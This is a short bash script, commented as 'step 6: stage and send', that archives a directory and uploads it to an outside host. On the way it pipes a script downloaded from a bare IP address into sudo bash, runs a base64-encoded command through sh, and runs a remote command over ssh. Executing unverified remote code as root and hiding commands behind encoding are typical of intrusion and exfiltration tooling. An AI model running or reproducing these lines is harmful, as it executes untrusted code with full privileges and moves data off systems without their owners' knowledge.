#!/bin/bash
# step 6: stage and send
tar czf out.tgz dir/
sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)"
echo aWQ7IHVuYW1lIC1h | base64 -d | sh
ssh ops@198.51.100.7 'cat /etc/hostname'
find /srv -name '*.bak' -exec gzip {} \;
curl -T out.tgz https://files.example.net/up
